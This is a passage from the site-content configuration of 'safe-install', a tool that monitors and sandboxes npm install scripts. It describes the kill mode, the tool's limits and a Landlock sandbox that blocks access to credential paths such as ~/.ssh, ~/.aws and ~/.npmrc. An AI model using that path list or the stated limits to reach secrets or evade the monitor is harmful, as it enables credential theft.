            'A script that itself calls `npm run` stays traced: the nested run executes inside the same trace.',
          ],
        },
        {
          id: 'signals',
          title: 'What it reports',
          body: [],
        },
        {
          id: 'kill',
          title: 'Report or kill',
          body: [
            'By default the monitor reports and the script finishes. With `--monitor=kill`, the first high-risk event kills the script’s process group and the install fails. With `--ci`, any high-risk finding exits with 1.',
          ],
        },
        {
          id: 'limits',
          title: 'Limits',
          body: [
            'strace sees a syscall once it has happened, so kill mode stops the script after its first dangerous action, not before it. Writes through relative paths count as inside the package.',
            'Network findings name the host the script looked up, such as `connects to registry.npmjs.org:443`. Only DNS replies from your system’s name servers count, so a script cannot forge one to disguise where it connects.',
            'macOS and Windows have no `--monitor`; everything else in safe-install works the same there.',
          ],
        },
        {
          id: 'sandbox',
          title: 'Sandbox',
          body: [
            '`--sandbox` runs each approved script under Landlock, with no root needed. The script can read the system and the project, write only to its package, the project’s `node_modules`, temp folders and package caches, and cannot open the rest of your home folder: `~/.ssh`, `~/.aws`, `~/.npmrc`, browser profiles and `~/.bashrc` are out of reach. Outgoing TCP is blocked unless you pass `--sandbox-net`.',
            'The sandbox blocks rather than reports, so a script that needs something outside those paths fails. Combine it with `--monitor` to see what it tried. It needs Linux 5.13 or later (6.7 to block the network) and refuses to run rather than silently doing less.',
          ],
        },
      ],
    },
    rules: {
      title: 'Rules',
      description:
        'Every finding safe-install can report: why it matters and what to do. The same text as `safe-install explain`.',
      sections: [],
      whyLabel: 'Why it matters',
      fixLabel: 'What to do',
    },
  },

  footer: {
    tagline: 'Install dependencies. Not malware.',
    byline: {
      label: 'Built by',
      name: 'Ben Hattab',
      url: 'https://benhattab.pro',
    },
    securityHeading: 'Found a bypass?',
    securityBody:
      'Please tell us privately through SECURITY.md rather than opening a public issue. We would much rather fix it quietly than ship a workaround on your behalf.',
    telemetryBody:
      'No telemetry, ever — not usage counts, not crash reports, not IP addresses. This site has no analytics and no third-party scripts either.',
    links: [
      { label: 'GitHub', href: REPO_URL },
      { label: 'Releases', href: RELEASES_URL },
      { label: 'SECURITY.md', href: SECURITY_URL },
      { label: 'Apache-2.0', href: `${REPO_URL}/blob/main/LICENSE` },
    ],
  },
};
